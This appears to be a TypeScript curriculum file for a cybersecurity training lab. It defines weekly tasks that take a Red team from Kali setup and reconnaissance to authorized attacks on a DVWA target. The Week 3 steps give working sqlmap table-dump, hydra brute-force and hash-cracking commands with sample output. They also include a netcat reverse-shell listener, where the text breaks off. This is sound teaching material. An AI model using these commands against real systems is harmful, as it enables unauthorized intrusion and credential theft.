import { Task, Week, Gate } from './types';

// Week Metadata
export const WEEKS: Record<number, Week> = {
  0: {
    number: 0,
    title: 'Lab Setup & Rules of Engagement',
    theme: 'Stand up your environment and agree the rules before any testing',
    objective: 'Get your tools running, reach your targets, and confirm authorized scope',
    runs: 'Run 00',
    setup: true,
    stage: 0,
    phase: 'Arrive & Authorize',
    difficulty: 1,
    flow: ['Boot the lab', 'Reach the target', 'Agree the rules'],
    milestone: 'Your Kali reaches the target, DVWA loads, and the Rules of Engagement are signed.'
  },
  1: {
    number: 1,
    title: 'Cold Recon',
    theme: 'Build, connect, passive recon, baseline hardening',
    objective: 'Establish baseline, passive reconnaissance, and foundational security controls',
    runs: 'Run 01',
    stage: 1,
    phase: 'Survey & Harden',
    difficulty: 2,
    flow: ['Passive recon', 'Harden the host', 'Pick the framework'],
    milestone: 'You have an OSINT profile of the target, a hardened baseline, and a named control framework.'
  },
  2: {
    number: 2,
    title: 'Hard Target',
    theme: 'Authorized vulnerability assessment + SOC detection engineering',
    objective: 'Perform vulnerability discovery and detection engineering',
    runs: 'Run 02',
    stage: 2,
    phase: 'Probe & Instrument',
    difficulty: 2,
    flow: ['Enumerate services', 'Baseline the host', 'Rate the risks'],
    milestone: 'Every open service is listed with its version, and each risk has a likelihood and impact rating.'
  },
  3: {
    number: 3,
    title: 'The Breach',
    theme: 'Attack, detect, investigate, preserve evidence',
    objective: 'Execute authorized attacks and investigate findings',
    runs: 'Run 03',
    stage: 3,
    phase: 'Breach & Detect',
    difficulty: 3,
    flow: ['Attack', 'Detect', 'Preserve evidence'],
    milestone: 'An attack succeeded, Blue caught it in the logs, and the evidence is hashed with an unbroken chain of custody.'
  },
  4: {
    number: 4,
    title: 'Payday',
    theme: 'Report and present findings',
    objective: 'Compile and present final findings and recommendations',
    runs: 'Run 04',
    stage: 4,
    phase: 'Report & Brief',
    difficulty: 2,
    flow: ['Respond', 'Write it up', 'Brief the client'],
    milestone: 'The incident is closed and the final report and briefing are ready to hand over.'
  }
};

// Gates
export const GATES: Gate[] = [
  {
    id: 1,
    week: 1,
    title: 'Gate 1',
    description: 'Case + Scope authored',
    requiredArtifactTypes: ['case_overview', 'scope_document'],
    requiredTasks: ['red-w1-osint', 'blue-w1-hardening', 'grc-w1-framework'],
    handoffs: [
      { from: 'grc', to: 'red', artifact: 'Rules_of_Engagement.md', label: 'Confirm authorized scope before any scanning' },
      { from: 'grc', to: 'blue', artifact: 'Hardening_Standard.md', label: 'Issue the hardening standard Blue implements' },
      { from: 'red', to: 'grc', artifact: 'Recon_Findings.md', label: 'Hand recon to GRC for the asset inventory' },
      { from: 'blue', to: 'grc', artifact: 'Hardening_Checklist.txt', label: 'Report what was hardened for the policy baseline' },
    ],
  },
  {
    id: 2,
    week: 2,
    title: 'Gate 2',
    description: 'Hardening + Logs in place',
    requiredArtifactTypes: ['hardening_checklist', 'baseline_logs'],
    requiredTasks: ['blue-w2-baseline', 'red-w2-enumeration', 'grc-w2-risk'],
    handoffs: [
      { from: 'grc', to: 'blue', artifact: 'VM_SOP.md', label: 'Issue the vulnerability-management SOP Blue follows' },
      { from: 'red', to: 'grc', artifact: 'Vulnerability_Summary.md', label: 'Hand findings to GRC for risk scoring' },
      { from: 'blue', to: 'grc', artifact: 'Detection_Rules.txt', label: 'Report the detections now in place' },
    ],
  },
  {
    id: 3,
    week: 3,
    title: 'Gate 3',
    description: 'Findings + Evidence complete',
    requiredArtifactTypes: ['pcap', 'findings', 'evidence_log'],
    requiredTasks: ['red-w3-attacks', 'blue-w3-detection', 'grc-w3-custody'],
    handoffs: [
      { from: 'grc', to: 'blue', artifact: 'IR_Runbook.md', label: 'Issue the incident-response runbook Blue follows during the breach' },
      { from: 'red', to: 'grc', artifact: 'Evidence_Photos.zip', label: 'Submit attack evidence for chain of custody' },
      { from: 'blue', to: 'grc', artifact: 'Incident_Response.txt', label: 'Submit IR notes and logs for custody' },
    ],
  },
  {
    id: 4,
    week: 4,
    title: 'Gate 4',
    description: 'Final report & briefing delivered',
    requiredArtifactTypes: ['final_report'],
    requiredTasks: ['red-w4-briefing', 'blue-w4-response', 'grc-w4-report'],
    handoffs: [
      { from: 'red', to: 'grc', artifact: 'Attack_Briefing.md', label: 'Hand the attacker’s story to GRC for the final report' },
      { from: 'blue', to: 'grc', artifact: 'Defense_Summary.md', label: 'Hand the detection & response summary to GRC' },
      { from: 'grc', to: 'grc', artifact: '08_Final_Report_and_Briefing.md', label: 'GRC compiles everything into the final report & client briefing' },
    ],
  }
];

// RED (Runners) Tasks
const RED_TASKS: Task[] = [
  {
    id: 'red-w0-setup',
    role: 'red',
    week: 0,
    title: 'Get Kali Ready & Confirm Scope',
    objective: 'Boot your Kali attack box, reach your company target, and confirm what you are authorized to test.',
    frameworks: ['NIST_CSF'],
    deliverables: [],
    learn: ['Booting and updating Kali Linux', 'Verifying network reach to a target', 'Reading the Rules of Engagement (authorized scope)'],
    tools: ['Kali Linux', 'ip / ping', 'apt'],
    prerequisites: ['Your company target IP (from the instructor)', "GRC's Rules_of_Engagement.md once issued", 'The DVWA web target is stood up by Blue in Week 0 (http://<UBUNTU_IP>/)'],
    definitionOfDone: ['Kali boots and is fully updated', 'You can ping your company target', 'You have read and understood the authorized scope'],
    handoff: [{ to: 'grc', note: 'Acknowledge the Rules of Engagement so GRC knows scope is understood.' }],
    steps: [
      {
        id: 'red-w0-s1',
        title: 'Boot & Update Kali',
        description: 'Boot your Kali VM and refresh then upgrade all packages.',
        instruction: 'Start the Kali VM, open a terminal, and run the update command.',
        commands: [
          { cmd: 'sudo apt update', explain: 'Refresh the package list so you install the newest versions.' },
          { cmd: 'sudo apt -y upgrade', explain: 'Install all available updates (-y auto-confirms).' },
        ],
        expectedOutput: 'Packages refreshed and upgraded',
        outputExplanation: 'A clean prompt with no errors means your tools are current; a long "upgraded, newly installed" summary is normal the first run.',
        whatItMeans: 'Your attack tools are patched and current before you begin.',
        frameworks: ['NIST_CSF'],
        troubleshooting: 'If apt reports a lock error, another update is running — wait a minute and retry, or reboot the VM.',
      },
      {
        id: 'red-w0-s2',
        title: 'Verify You Can Reach Your Target',
        description: 'Ping your assigned company host to confirm it is reachable.',
        instruction: 'Replace the placeholder with your target IP and run the ping.',
        commands: [
          {
            cmd: 'ping -c 2 <YOUR_TARGET_IP>',
            explain: 'Send two small test packets to your target and wait for replies. Replace <YOUR_TARGET_IP> with your target’s address (or set it in the Lab access panel and it fills in automatically).',
            flags: [
              { flag: 'ping', meaning: 'Checks whether another computer is reachable on the network.' },
              { flag: '-c 2', meaning: 'Send only 2 packets then stop (without -c, ping runs forever — press Ctrl+C to stop).' },
              { flag: '<YOUR_TARGET_IP>', meaning: 'The address to test, e.g. 10.10.10.5.' },
            ],
          },
        ],
        expectedOutput: '2 packets transmitted, 2 received, 0% packet loss',
        outputExplanation: 'Low-time replies mean reachable; "Destination host unreachable" or 100% loss is a network problem to fix before scanning.',
        whatItMeans: 'You have a live network path to the box you are authorized to test.',
        frameworks: ['NIST_CSF'],
        troubleshooting: 'No reply? Check your VM network adapter is on the lab network (as the instructor specified) and the target is powered on.',
      },
      {
        id: 'red-w0-s3',
        title: 'Confirm Authorized Scope',
        description: 'Confirm what you are authorized to test.',
        instruction: 'Read the Rules of Engagement from GRC and confirm your authorized target(s) before any scanning.',
        whatItMeans: 'You attack only your own target, within the approved window.',
        frameworks: ['NIST_CSF'],
      },
    ],
  },
  {
    id: 'red-w1-osint',
    role: 'red',
    week: 1,
    title: 'OSINT & Passive Recon',
    objective: 'Gather open-source intelligence and passively fingerprint the target to build an asset list.',
    frameworks: ['NIST_CSF'],
    deliverables: ['Recon_Findings.md'],
    prerequisites: ['Setup_Notes_Red.md (Week 0: Kali ready, target reachable)', "GRC's Rules_of_Engagement.md (authorized scope)"],
    definitionOfDone: ['Assets and services identified', 'Recon_Findings.md and Asset_List.md saved to ~/team-artifacts/week-1/'],
    handoff: [{ to: 'grc', artifact: 'Asset_List.md + Recon_Findings.md', note: 'Feed recon into the asset inventory and risk mapping.' }],
    learn: ['OSINT & passive recon', 'DNS / WHOIS enumeration', 'Fingerprinting web tech with Kali'],
    tools: ['whois / dig', 'whatweb', 'theHarvester'],
    steps: [
      {
        id: 'red-w1-s1',
        title: 'Verify Connectivity',
        description: 'List your own IP and ping the target to confirm you share a subnet.',
        instruction: 'Run the command and note your ens18 address and the ping reply.',
        commands: [
          { cmd: 'ip a', explain: 'List your network interfaces and IP addresses.' },
          { cmd: 'ping -c 1 10.10.10.1', explain: 'Send one packet to the target to confirm it answers.' },
        ],
        commandExplanation: '`ip a` lists every network interface and its assigned address; `ping -c 1` sends a single ICMP echo (the `-c 1` caps it at one packet) to confirm the target answers.',
        commandFlags: [
          { flag: 'ip a', meaning: 'Show all network interfaces and their IP addresses.' },
          { flag: 'ping', meaning: 'Send ICMP echo requests to test reachability.' },
          { flag: '-c 1', meaning: 'Stop after 1 packet instead of pinging forever.' },
          { flag: '10.10.10.1', meaning: 'The host being pinged (the gateway/target).' },
        ],
        expectedOutput: 'ens18 inet 10.10.100.X, ping reply from target',
        outputExplanation: 'The `ens18` `inet` line in the 10.10.100.X range is your IP, and a "1 received, 0% packet loss" line proves the target answers.',
        whatItMeans: 'Your Kali box and the target sit on the same subnet, so scanning will work.',
        frameworks: ['NIST_CSF'],
        fixes: [
          { symptom: 'No ping reply?', fix: 'Confirm the target VM is on and on the same lab network, and that .1 is your gateway (yours may differ — use the address from Lab access).' },
          { symptom: '"Network is unreachable"?', fix: 'Your Kali NIC may be on the wrong adapter — check that `ip a` shows a 10.10.100.X address.' },
        ],
      },
      {
        id: 'red-w1-s2',
        title: 'WHOIS & DNS Enumeration',
        description: 'Query registration and DNS records to map the target domain.',
        instruction: 'Run the WHOIS and DNS lookups and note the registrar, name servers, and mail servers.',
        commands: [
          { cmd: 'whois target.local', explain: 'Query domain registration / ownership records.' },
          { cmd: 'dig ANY target.local', explain: 'Ask DNS for every record type for the domain.' },
          { cmd: 'nslookup -type=mx target.local', explain: 'Look up only mail-exchanger (mail server) records.' },
        ],
        commandExplanation: '`whois` pulls registration/ownership records; `dig ANY` asks DNS for every record type at once; `nslookup -type=mx` narrows the query to just mail-exchanger records.',
        commandFlags: [
          { flag: 'whois', meaning: 'Query domain registration / ownership records.' },
          { flag: 'dig ANY', meaning: 'Ask DNS for every record type for the domain.' },
          { flag: 'nslookup -type=mx', meaning: 'Look up only mail-exchanger (mail server) records.' },
        ],
        expectedOutput: 'Domain info, A/MX/NS records',
        outputExplanation: 'The `whois` block shows the registrar and contacts; `dig` lists A, NS and MX records, with the MX names revealing where the target receives email.',
        whatItMeans: 'You now know the target owner, mail servers, and DNS structure.',
        frameworks: ['NIST_CSF', 'CIS'],
        fixes: [
          { symptom: 'No records, or "connection timed out; no servers could be reached"?', fix: 'The lab domain may not resolve on your DNS — point dig at the lab DNS (dig @<UBUNTU_IP> ANY target.local) or use the target IP directly.' },
          { symptom: 'whois returns nothing?', fix: 'Expected for a private lab domain.' },
        ],
      },
      {
        id: 'red-w1-s3',
        title: 'Web Tech Discovery',
        description: 'Fingerprint the target web stack and save the results to Recon_Findings.md.',
        instruction: 'Run whatweb and tee its output into the canonical recon file.',
        commands: [
          { cmd: 'mkdir -p ~/team-artifacts/week-1', explain: 'Create the week-1 artifacts folder (no error if it exists).' },
          { cmd: 'whatweb http://10.10.100.X | tee ~/team-artifacts/week-1/Recon_Findings.md', explain: 'Fingerprint the web stack and save the output to your recon file.' },
        ],
        commandExplanation: '`whatweb` fingerprints the server, language and frameworks behind the URL, and `tee` both prints them and saves them to Recon_Findings.md.',
        commandFlags: [
          { flag: 'whatweb', meaning: 'Fingerprint a website’s server, language and frameworks.' },
          { flag: 'http://10.10.100.X', meaning: 'The target URL to fingerprint.' },
        ],
        expectedOutput: 'Detected technologies printed and saved to Recon_Findings.md',
        outputExplanation: 'Each `[name version]` tag is a detected technology; record exact versions (e.g. Apache 2.4.x, PHP 5.x) because old versions map to known CVEs.',
        whatItMeans: 'You have a saved record of the exact software versions that may be exploitable.',
        frameworks: ['CIS', 'OWASP'],
        producesDeliverable: 'Recon_Findings.md',
        isEvidenceStep: true,
        troubleshooting: '"whatweb: command not found"? Install it: sudo apt install whatweb. No output? Use the full URL with http:// and confirm the site loads in a browser first.',
      },
      {
        id: 'red-w1-s4',
        title: 'Email/Host Discovery',
        description: 'Harvest emails, subdomains, and hosts for the target domain.',
        instruction: 'Run theHarvester against the target domain and note candidate usernames and subdomains.',
        commands: [
          {
            cmd: 'theHarvester -d target.local -b all',
            explain: 'Gather public info (emails, subdomains, hosts) about the domain from many sources at once.',
            flags: [
              { flag: 'theHarvester', meaning: 'An OSINT tool that collects domain intelligence.' },
              { flag: '-d target.local', meaning: 'The domain to gather information about.' },
              { flag: '-b all', meaning: 'Use every available data source (search engines, certs, etc.).' },
            ],
          },
        ],
        expectedOutput: 'Email list, subdomains, hosts',
        outputExplanation: 'Results are grouped into emails, hosts and subdomains — the email addresses become candidate usernames and the subdomains reveal extra attack surface.',
        whatItMeans: 'You have candidate usernames and additional infrastructure to target.',
        frameworks: ['NIST_CSF'],
        troubleshooting: '"command not found"? sudo apt install theharvester. A single source erroring or rate-limiting is normal — try one source instead of all, e.g. -b bing. In an offline lab most public sources return nothing; that is expected.',
      },
      {
        id: 'red-w1-s5',
        title: 'Export to Asset List',
        description: 'Hand your discovered assets to GRC.',
        instruction: 'List the hosts and services you found and give them to GRC — they enter them into the Asset Inventory form.',
        whatItMeans: 'Your recon becomes the team asset inventory.',
        frameworks: ['NIST_CSF'],
      }
    ]
  },
  {
    id: 'red-w2-enumeration',
    role: 'red',
    week: 2,
    title: 'Vulnerability Discovery',
    objective: 'Perform authorized vulnerability enumeration using network and web scanning.',
    frameworks: ['NIST_CSF', 'CIS', 'OWASP'],
    deliverables: ['Nmap_Scan.txt', 'Nikto_Report.txt'],
    prerequisites: ['Week 1 asset list', 'Scope still valid (Rules of Engagement)'],
    definitionOfDone: ['All ports & web vulnerabilities enumerated', 'Vulnerability_Summary.md written for GRC'],
    handoff: [{ to: 'grc', artifact: 'Vulnerability_Summary.md', note: 'Hand findings to GRC for risk scoring.' }],
    learn: ['Port & service scanning with nmap', 'Web scanning with nikto', 'Summarizing vulnerabilities'],
    tools: ['nmap', 'nikto'],
    steps: [
      {
        id: 'red-w2-s1',
        title: 'Network Scan - All Ports',
        description: 'Scan all TCP ports with version detection.',
        commands: [
          { cmd: 'mkdir -p ~/team-artifacts/week-2', explain: 'Make the week-2 folder to save your scan into. -p means "create parents and don’t error if it already exists".' },
          {
            cmd: 'nmap -sV -p- 10.10.100.X > ~/team-artifacts/week-2/Nmap_Scan.txt',
            explain: 'Scan every port on the target and save the results. Replace 10.10.100.X with your target IP (or set it once in the Lab access panel and it auto-fills).',
            flags: [
              { flag: 'nmap', meaning: 'The network port-scanner tool.' },
              { flag: '-sV', meaning: 'Probe each open port to identify the service and its version.' },
              { flag: '-p-', meaning: 'Scan all 65,535 ports, not just the common ones.' },
              { flag: '> …Nmap_Scan.txt', meaning: 'Write the output to a file (> means "save to"; it overwrites).' },
            ],
          },
        ],
        expectedOutput: `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.100.20
Host is up (0.00038s latency).
Not shown: 65531 closed tcp ports (conn-refused)

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
3306/tcp open  mysql   MySQL 5.7.40

Service detection performed. Nmap done: 1 IP address (1 host up) scanned in 88.14 seconds`,
        outputHighlights: [
          { text: 'open', label: 'the only state worth your time. Closed and filtered ports are not entry points; open ones are your candidate targets.' },
          { text: 'OpenSSH 8.2p1 Ubuntu 4ubuntu0.9', label: 'a full version string. Note it exactly — the version, not just "SSH", is what you look up for known vulnerabilities.' },
          { text: '8080/tcp open  http', label: 'the DVWA web app port you attack in Week 3. Finding it here is what tells you where to point sqlmap and hydra.' },
          { text: '1 IP address (1 host up)', label: 'you scanned exactly one host. More than one means you strayed outside the authorised target — a Rules-of-Engagement breach.' },
        ],
        whatItMeans: 'Discovers all listening network services and their versions.',
        frameworks: ['CIS'],
        producesDeliverable: 'Nmap_Scan.txt',
        isEvidenceStep: true,
        fixes: [
          { symptom: '"Host seems down"?', fix: 'Add -Pn to skip the ping check.' },
          { symptom: 'No open ports, or a hang?', fix: 'Confirm the target is up (ping it) and that you used the right IP from Lab access. An all-port scan is slow — give it a minute.' },
        ],
      },
      {
        id: 'red-w2-s2',
        title: 'Web Vulnerability Scan',
        description: 'Run automated web scanner against target.',
        commands: [
          { cmd: 'mkdir -p ~/team-artifacts/week-2', explain: 'Make the week-2 folder to save your report into (safe to run again).' },
          {
            cmd: 'nikto -h http://10.10.100.X -o ~/team-artifacts/week-2/Nikto_Report.txt',
            explain: 'Scan the target web server for known issues and misconfigurations, saving the report to a file.',
            flags: [
              { flag: 'nikto', meaning: 'An automated web-server vulnerability scanner.' },
              { flag: '-h http://10.10.100.X', meaning: 'The host (URL) to scan.' },
              { flag: '-o …Nikto_Report.txt', meaning: 'Write the findings to this report file (-o = output).' },
            ],
          },
        ],
        expectedOutput: `+ Target IP:          10.10.100.20
+ Target Port:        80
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: Server may leak inodes via ETags, header found with file /, fields: 0x2aa6 0x5c9...
+ /icons/README: Apache default file found.
+ /config/: Directory indexing found.
+ 8074 requests: 0 error(s) and 6 item(s) reported on remote host`,
        outputHighlights: [
          { text: '+ Server: Apache/2.4.41 (Ubuntu)', label: 'the same version nmap reported. Two tools agreeing is corroboration worth stating in the report, not a duplicate to drop.' },
          { text: '/config/: Directory indexing found.', label: 'the serious one. A browsable config directory can expose credentials — rank it above the header findings.' },
          { text: '/icons/README: Apache default file found.', label: 'a leftover default file. Low risk alone, but it confirms the server was never hardened.' },
          { text: '6 item(s) reported', label: 'the scan completed and found six issues. A run that errors out early leaves your finding list incomplete.' },
        ],
        whatItMeans: 'Identifies common web misconfigurations and known web vulnerabilities.',
        frameworks: ['OWASP'],
        producesDeliverable: 'Nikto_Report.txt',
        isEvidenceStep: true,
        troubleshooting: '"0 host(s) tested" or connection error? The web server isn\'t reachable — open http://<target>/ in a browser first, check the IP, and make sure DVWA/Apache is running. Use the full URL including http://.',
      },
      {
        id: 'red-w2-s3',
        title: 'SSH Auth Methods',
        description: 'Identify authentication methods on SSH.',
        commands: [
          {
            cmd: 'nmap --script ssh-auth-methods 10.10.100.X',
            explain: 'Ask the SSH server which login methods it accepts (password vs key).',
            flags: [
              { flag: 'nmap', meaning: 'The scanner (also runs helper scripts).' },
              { flag: '--script ssh-auth-methods', meaning: 'Run the NSE script that lists accepted SSH auth methods.' },
              { flag: '10.10.100.X', meaning: 'The SSH host to query — your target IP.' },
            ],
          },
        ],
        expectedOutput: `PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey
|_    password
Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds`,
        outputHighlights: [
          { text: 'password', label: 'this is the finding. Password auth being accepted is exactly what makes the SSH brute force in Week 3 possible.' },
          { text: 'publickey', label: 'the safer method. If ONLY this were listed, brute forcing would be pointless — the presence of password alongside it is the weakness.' },
        ],
        whatItMeans: 'Password auth enabled = brute force risk; SSH key only would be better.',
        frameworks: ['CIS'],
        troubleshooting: '"Host seems down"? Add -Pn. No SSH result? Confirm port 22 is open (from the earlier nmap scan) and the target is reachable. "Failed to resolve"? Use the numeric IP, not a hostname.',
      },
      {
        id: 'red-w2-s4',
        title: 'Summarize Vulnerabilities for GRC',
        description: 'Summarize your scan findings for the report.',
        instruction: 'Write up your nmap and nikto findings in the Penetration Test Report form — it builds the report for you.',
        whatItMeans: 'GRC gets a clean, ranked list to risk-score instead of raw scan dumps.',
        frameworks: ['NIST_CSF'],
        usesForm: 'Penetration Test Report',
      }
    ]
  },
  {
    id: 'red-w3-attacks',
    role: 'red',
    week: 3,
    title: 'Authorized Attacks & Evidence',
    objective: 'Execute one well-documented exploit chain with complete evidence trail.',
    frameworks: ['OWASP', 'NIST_800_61', 'CVSS'],
    deliverables: ['SQL_Injection_Proof.txt', 'Brute_Force_Proof.txt', 'Reverse_Shell_Proof.txt', 'Metasploit_Proof.txt', 'Evidence_Photos.zip'],
    prerequisites: ['Confirmed vulnerabilities from Week 2', 'Rules of Engagement (stay in scope)'],
    definitionOfDone: ['One full exploit chain proven with evidence', 'All *_Proof.txt + Evidence_Photos.zip saved'],
    handoff: [{ to: 'grc', artifact: 'Evidence_Photos.zip', note: 'Submit attack evidence for chain of custody.' }],
    learn: ['Exploiting SQL injection', 'Brute-forcing authentication', 'Command injection & reverse shells', 'Metasploit framework exploitation', 'Capturing court-ready evidence'],
    tools: ['sqlmap', 'hydra', 'netcat', 'metasploit'],
    steps: [
      {
        id: 'red-w3-s1',
        title: 'SQL Injection Attack',
        description: 'Dump the DVWA users table through the SQL-injection page.',
        instruction: 'In a browser, log into DVWA and set Security = Low (DVWA Security page), then open the SQL Injection page once so the id parameter exists. Run sqlmap from your Kali terminal against that URL.',
        commands: [
          { cmd: 'mkdir -p ~/team-artifacts/week-3', explain: 'Make the week-3 folder to save your proof into (safe to run again).' },
          {
            cmd: 'sudo sqlmap -u "http://<YOUR_TARGET_IP>:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --auth-type=BASIC --auth-creds=admin:password -D dvwa -T users --dump | tee ~/team-artifacts/week-3/SQL_Injection_Proof.txt',
            explain: 'Point sqlmap at the injectable id parameter on the DVWA SQLi page and dump the users table — usernames and password hashes — while saving everything to a proof file.',
            flags: [
              { flag: 'sqlmap', meaning: 'Automates finding and exploiting SQL injection.' },
              { flag: '-u "…/sqli/?id=1&Submit=Submit"', meaning: 'The exact URL to test — the injectable id parameter on the SQLi page.' },
              { flag: '--auth-type=BASIC', meaning: 'The app is behind HTTP Basic auth — authenticate that way first.' },
              { flag: '--auth-creds=admin:password', meaning: 'The Basic-auth username:password.' },
              { flag: '-D dvwa', meaning: 'Target the dvwa database.' },
              { flag: '-T users', meaning: 'Target the users table inside it.' },
              { flag: '--dump', meaning: 'Extract (dump) the rows of that table.' },
              { flag: '| tee …SQL_Injection_Proof.txt', meaning: 'Show output on screen AND save a copy to the file (tee does both).' },
            ],
          },
        ],
        expectedOutput: `[INFO] GET parameter 'id' is 'MySQL >= 5.0.12 AND time-based blind' injectable
[INFO] the back-end DBMS is MySQL
Database: dvwa
Table: users
[5 entries]
+---------+---------+----------------------------------+
| user    | user_id | password                         |
+---------+---------+----------------------------------+
| admin   | 1       | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | 2       | e99a18c428cb38d5f260853678922e03 |
| 1337    | 3       | 8d3533d75ae2c3966d7e0d4fcc69216b |
+---------+---------+----------------------------------+`,
        outputHighlights: [
          { text: "GET parameter 'id' is", label: 'sqlmap confirming the parameter is injectable. This line is the vulnerability itself — everything below is the consequence.' },
          { text: 'Table: users', label: 'you reached the database and read a table you were never meant to. This is the exfiltration, proven.' },
          { text: '5f4dcc3b5aa765d61d8327deb882cf99', label: 'admin’s password hash. This exact unsalted-MD5 value is "password" — worth noting in the report to show how quickly the dump becomes a working login.' },
        ],
        whatItMeans: 'Demonstrates data exfiltration risk from SQL injection.',
        frameworks: ['OWASP'],
        files: [
          { name: 'sqlmap', purpose: 'the SQL-injection tool (pre-installed on Kali)', source: 'sudo apt install -y sqlmap' },
          { name: 'DVWA on the target', purpose: 'must be up on :8080 with Security = Low, and the SQLi page opened once so the id parameter exists' },
        ],
        producesDeliverable: 'SQL_Injection_Proof.txt',
        isEvidenceStep: true,
        verify: ['users'],
        troubleshooting: '"unable to connect" — check <YOUR_TARGET_IP> and that DVWA is up on :8080. "not injectable"? Set DVWA Security to Low and confirm --auth-type=BASIC --auth-creds=admin:password. If it asks about a redirect or CSRF token, answer Y to continue.',
      },
      {
        id: 'red-w3-s2',
        title: 'Brute Force Attack',
        description: 'Guess the DVWA admin password with hydra against the Brute Force lab page.',
        instruction: 'Target the DVWA "Brute Force" lab page — NOT the main login.',
        instructionList: [
          'login.php has a per-request anti-CSRF user_token that hydra cannot submit, so a password it "finds" there will not actually log you in.',
          'The Brute Force page has no such token on Low, so that is the one to attack.',
          'You must be logged in first: in the browser, log into DVWA and set Security = Low.',
          'Copy your PHPSESSID cookie (DevTools → Application → Cookies) and paste it into the command below.',
        ],
        commands: [
          { cmd: 'mkdir -p ~/team-artifacts/week-3', explain: 'Kali terminal: make the week-3 folder to save your proof into (safe to run again).' },
          { cmd: 'sudo apt-get install -y wordlists', explain: 'Install the wordlists package (ships the rockyou password list). Safe to run if already installed.' },
          { cmd: '[ -f /usr/share/wordlists/rockyou.txt ] || sudo gunzip /usr/share/wordlists/rockyou.txt.gz', explain: 'Unzip rockyou the first time only — this line does nothing if it is already unzipped.' },
          {
            cmd: 'sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt <YOUR_TARGET_IP> -s 8080 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\\: PHPSESSID=<your_session_id>; security=low:F=Username and/or password incorrect" | tee ~/team-artifacts/week-3/Brute_Force_Proof.txt',
            explain: 'Kali terminal: try every rockyou password for admin against the DVWA Brute Force page. It sends your logged-in cookie so the page answers, and keeps going until the "incorrect" failure text disappears. Replace <your_session_id> with your PHPSESSID.',
            flags: [
              { flag: 'hydra', meaning: 'Tries many login guesses quickly.' },
              { flag: '-l admin', meaning: 'The single username to try (lowercase L = one login name).' },
              { flag: '-P …/rockyou.txt', meaning: 'The password list to try, one per line (uppercase P = list).' },
              { flag: '<YOUR_TARGET_IP> -s 8080', meaning: 'The DVWA host and port.' },
              { flag: 'http-get-form "path:params:conditions"', meaning: 'The DVWA Brute Force page uses GET — so http-get-form, not http-post-form.' },
              { flag: '/vulnerabilities/brute/', meaning: 'The Brute Force lab — unlike login.php it has no CSRF token on Low, so hydra can actually drive it.' },
              { flag: '^USER^ / ^PASS^', meaning: 'Placeholders hydra swaps in for each guess.' },
              { flag: 'H=Cookie\\: PHPSESSID=…; security=low', meaning: 'Send your logged-in session + Low security so the page accepts the requests (H = add a header).' },
              { flag: 'F=Username and/or password incorrect', meaning: 'The failure text on this page — hydra stops when it no longer appears.' },
            ],
          },
        ],
        expectedOutput: `Hydra v9.5 (c) 2023 by van Hauser/THC
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
[ATTEMPT] target 10.10.100.20 - login "admin" - pass "123456"
[ATTEMPT] target 10.10.100.20 - login "admin" - pass "12345"
[8080][http-get-form] host: 10.10.100.20   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found`,
        outputHighlights: [
          { text: 'login: admin   password: password', label: 'the whole point: a PLAINTEXT working password, not a hash. This is a credential you can log in with right now — weak password plus no lockout, proven.' },
          { text: '1 valid password found', label: 'the run succeeded. "0 valid passwords" usually means your session cookie or the F= failure string is wrong, not that the password is strong.' },
          { text: '[ATTEMPT]', label: 'each guess. A flood of these with no lockout is itself the finding — a hardened server would have blocked the account after a few tries.' },
        ],
        whatItMeans: 'Shows weak password vulnerability and lack of account lockout.',
        frameworks: ['CIS', 'OWASP'],
        files: [
          { name: 'hydra', purpose: 'the login brute-forcer (pre-installed on Kali)', source: 'sudo apt install -y hydra' },
          { name: 'rockyou.txt wordlist', purpose: 'the password list hydra tries — the install + unzip commands above put it in place' },
          { name: 'Your DVWA PHPSESSID cookie', purpose: 'hydra must send your logged-in session; copy it from DevTools → Application → Cookies' },
        ],
        producesDeliverable: 'Brute_Force_Proof.txt',
        isEvidenceStep: true,
        verify: ['login: admin'],
        fixes: [
          { symptom: '"Found" password will not log you in?', fix: 'You aimed at /login.php — its per-request user_token (CSRF) makes hydra hits false. Use /vulnerabilities/brute/ with your cookie (above).' },
          { symptom: 'Hydra says EVERY password works?', fix: 'Your PHPSESSID/security cookie is wrong or expired, or the F= text does not match — open the page, submit a bad password, and copy the exact "Username and/or password incorrect" text.' },
          { symptom: 'rockyou.txt "No such file"?', fix: 'It is gzipped: sudo gunzip /usr/share/wordlists/rockyou.txt.gz.' },
          { symptom: 'Got a HASH from the SQL-injection dump instead of a password?', fix: 'Those are unsalted MD5 — crack them: save the hash to a file and run john --format=raw-md5 hash.txt (or hashcat -m 0). DVWA admin\'s 5f4dcc3b5aa765d61d8327deb882cf99 = "password".' },
        ],
      },
      {
        id: 'red-w3-s3',
        title: 'Command Injection & Reverse Shell',
        description: 'Catch a shell from the target using a command-injection payload.',
        instruction: 'A two-window attack. Know where each line goes.',
        instructionList: [
          'DVWA usually runs in a minimal Docker container with no nc and no bash — so the PHP payload (command 4) is the one that reliably works; the nc/bash payloads (5, 6) are fallbacks only if the container has them.',
          'Kali terminal: start the listener (command 2) and leave it running.',
          'Browser: DVWA (Security = Low) → Command Injection → "Enter an IP address" box. First run command 3 to see what the container has, then paste ONE payload (4, or fallback 5/6) and Submit.',
          'The page hangs while the shell is open — that is normal; look at your listener.',
          'Kali terminal: the shell lands in your listener. Run id, then save it and your notes to ~/team-artifacts/week-3/Reverse_Shell_Proof.txt.',
        ],
        commands: [
          { cmd: 'mkdir -p ~/team-artifacts/week-3', explain: 'Kali terminal: make the week-3 folder to save your proof into (safe to run again).' },
          {
            cmd: 'nc -lvnp 4444',
            explain: '① KALI VM terminal: start a listener and wait for the target to connect back. Leave this running in its own terminal.',
            flags: [
              { flag: 'nc', meaning: 'Netcat — raw TCP connections.' },
